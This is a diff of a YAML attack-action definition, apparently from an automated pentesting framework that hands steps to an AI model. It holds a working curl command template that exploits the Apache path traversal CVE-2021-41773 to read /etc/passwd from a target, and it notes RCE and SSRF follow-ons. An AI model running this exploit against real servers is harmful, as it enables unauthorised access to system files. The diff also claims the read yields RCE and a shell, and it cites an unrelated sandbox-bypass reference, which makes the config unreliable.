@@ -6,13 +6,14 @@ preconditions:
 parameters:
   target_ip: from_engagement.target_ip
 command_template: curl -s 'http://{target_ip}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
-parser: null
+parser: web_response_parser
 expected_effects:
-- action_completed
+- rce_achieved
+- shell_obtained
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'Apache 2.4.49/2.4.50 path traversal (CVE-2021-41773). If mod_cgi enabled,
-  path traversal → RCE. Also: mod_proxy SSRF, .htaccess upload for PHP execution.'
+mechanism: "Apache 2.4.49/2.4.50 path traversal (CVE-2021-41773). If mod_cgi enabled,\
+  \ path traversal \u2192 RCE. Also: mod_proxy SSRF, .htaccess upload for PHP execution."
 hacktricks_ref: generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md
